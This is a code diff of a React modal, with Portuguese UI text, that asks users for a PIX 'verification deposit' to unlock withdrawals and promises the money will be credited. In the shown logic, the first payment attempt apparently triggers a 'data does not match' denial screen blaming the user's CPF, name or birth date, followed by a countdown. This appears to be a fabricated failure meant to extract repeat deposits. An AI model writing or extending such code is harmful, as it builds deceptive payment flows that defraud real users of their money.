@@ -24,6 +24,7 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
   const [copied, setCopied] = useState(false);
   const [processingPayment, setProcessingPayment] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [errorTimer, setErrorTimer] = useState(0);
   const { pixData, createPix, checkPixStatus, reset } = useFictionalPix();
   const paymentCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const isProcessingRef = useRef(false);
@@ -43,6 +44,7 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
       setCopied(false);
       setProcessingPayment(false);
       setShowError(false);
+      setErrorTimer(0);
       isProcessingRef.current = false;
       hasTrackedPurchaseRef.current = false;
       reset();
@@ -77,12 +79,25 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
             if (isFirstAttempt) {
               setShowError(true);
 
+              let countdown = 8;
+              setErrorTimer(countdown);
+
+              const countdownInterval = setInterval(() => {
+                countdown -= 1;
+                setErrorTimer(countdown);
+
+                if (countdown <= 0) {
+                  clearInterval(countdownInterval);
+                }
+              }, 1000);
+
               setTimeout(() => {
+                clearInterval(countdownInterval);
                 onVerificationFailed();
                 setTimeout(() => {
                   onClose();
                 }, 500);
-              }, 3000);
+              }, 8000);
             } else {
               onVerificationComplete();
 
@@ -136,24 +151,52 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
   if (showError) {
     return (
       <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
-        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-orange-500 p-6 animate-scale-in">
-          <div className="text-center">
-            <div className="w-16 h-16 bg-orange-500/20 rounded-full flex items-center justify-center mx-auto mb-3">
-              <AlertTriangle className="w-8 h-8 text-orange-400" />
+        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-orange-500 animate-scale-in">
+          <div className="bg-orange-500/20 p-3 border-b border-orange-500/30">
+            <div className="flex items-center justify-center gap-2">
+              <AlertTriangle className="w-5 h-5 text-orange-400" />
+              <h3 className="text-white font-bold text-base">Verificacao Negada</h3>
             </div>
-            <h3 className="text-white font-bold text-lg mb-3">Ops! Dados nao conferem</h3>
-            <div className="bg-orange-500/10 rounded-lg p-3 mb-4 border border-orange-500/30">
-              <p className="text-orange-200 text-sm leading-relaxed mb-2">
-                Os dados informados nao correspondem ao titular da conta PIX.
+          </div>
+
+          <div className="p-4">
+            <div className="bg-orange-500/10 rounded-lg p-3 mb-3 border border-orange-500/30">
+              <p className="text-orange-200 text-sm font-semibold mb-2 text-center">
+                Os dados nao correspondem ao titular da conta PIX
               </p>
-              <p className="text-gray-300 text-xs leading-relaxed">
-                Por favor, verifique se o CPF, nome completo e data de nascimento estao corretos e coincidem com os dados do titular da conta bancaria.
+              <p className="text-gray-300 text-xs leading-relaxed text-center">
+                O CPF, nome completo e data de nascimento devem ser identicos aos dados cadastrados na sua conta bancaria
               </p>
             </div>
-            <div className="bg-blue-500/10 rounded-lg p-2.5 border border-blue-500/30">
-              <p className="text-blue-300 text-xs leading-relaxed">
-                Revise seus dados e tente novamente. Ao corrigir as informacoes, a verificacao sera aprovada com sucesso.
+
+            <div className="bg-blue-500/10 rounded-lg p-3 mb-3 border border-blue-500/30">
+              <div className="flex items-start gap-2">
+                <Info className="w-4 h-4 text-blue-400 mt-0.5 flex-shrink-0" />
+                <div>
+                  <h4 className="text-blue-300 font-bold text-xs mb-1">Como resolver:</h4>
+                  <ul className="text-blue-200 text-[10px] space-y-1 leading-relaxed">
+                    <li>• Confira se digitou seu CPF corretamente</li>
+                    <li>• Use seu nome completo sem abreviacoes</li>
+                    <li>• Verifique se a data de nascimento esta correta</li>
+                    <li>• Os dados devem ser iguais aos do titular da conta</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-green-500/10 rounded-lg p-2.5 border border-green-500/30 mb-3">
+              <p className="text-green-300 text-xs text-center leading-relaxed">
+                Apos corrigir os dados, sua verificacao sera aprovada e o valor creditado
               </p>
+            </div>
+
+            <div className="bg-gray-800 rounded-lg p-3 border border-gray-700">
+              <div className="flex items-center justify-center gap-2">
+                <div className="w-5 h-5 border-2 border-orange-400 border-t-transparent rounded-full animate-spin"></div>
+                <p className="text-gray-300 text-sm font-semibold">
+                  Voltando em {errorTimer}s...
+                </p>
+              </div>
             </div>
           </div>
         </div>
@@ -286,20 +329,32 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
 
         <div className="p-3">
 
-          <div className="bg-gray-800 rounded-lg p-4 border border-gray-700 text-center mb-3">
+          <div className="bg-gray-800 rounded-lg p-4 border border-gray-700 mb-3">
             <div className="w-12 h-12 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-2">
               <Shield className="w-6 h-6 text-accent" />
             </div>
-            <h3 className="text-white font-bold text-base mb-2">Deposito de Verificacao</h3>
-            <p className="text-gray-400 text-xs mb-3">
-              Confirme que voce e o titular da conta
+            <h3 className="text-white font-bold text-base mb-2 text-center">Verificacao de Titularidade</h3>
+            <p className="text-gray-300 text-xs mb-3 text-center leading-relaxed">
+              Faca um deposito minimo via PIX para confirmar sua identidade
             </p>
 
             <div className="bg-accent/10 rounded-lg p-3 mb-3 border border-accent/30">
-              <div className="text-accent text-2xl font-bold mb-1">
+              <div className="text-accent text-2xl font-bold mb-1 text-center">
                 R$ {DEPOSIT_AMOUNT.toFixed(2).replace('.', ',')}
               </div>
-              <p className="text-gray-400 text-[10px]">Valor minimo</p>
+              <p className="text-gray-400 text-[10px] text-center">Deposito de verificacao</p>
+            </div>
+
+            <div className="bg-green-500/10 rounded-lg p-2.5 mb-3 border border-green-500/30">
+              <div className="flex items-start gap-2">
+                <CheckCircle className="w-4 h-4 text-green-400 mt-0.5 flex-shrink-0" />
+                <div>
+                  <h4 className="text-green-300 font-bold text-xs mb-1">Valor sera creditado</h4>
+                  <p className="text-green-200 text-[10px] leading-relaxed">
+                    O valor sera adicionado ao seu saldo apos a verificacao
+                  </p>
+                </div>
+              </div>
             </div>
 
             <button
@@ -319,10 +374,13 @@ export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
             </button>
           </div>
 
-          <div className="bg-gray-800/50 rounded-lg p-2.5 border border-gray-700">
-            <p className="text-gray-400 text-[10px] text-center leading-relaxed">
-              Apos confirmacao, saques serao liberados automaticamente
-            </p>
+          <div className="bg-blue-500/10 rounded-lg p-2.5 border border-blue-500/30">
+            <div className="flex items-start gap-2">
+              <Info className="w-3.5 h-3.5 text-blue-400 mt-0.5 flex-shrink-0" />
+              <p className="text-blue-200 text-[10px] leading-relaxed">
+                Apos confirmar o deposito, os saques serao liberados automaticamente
+              </p>
+            </div>
           </div>
         </div>
       </div>
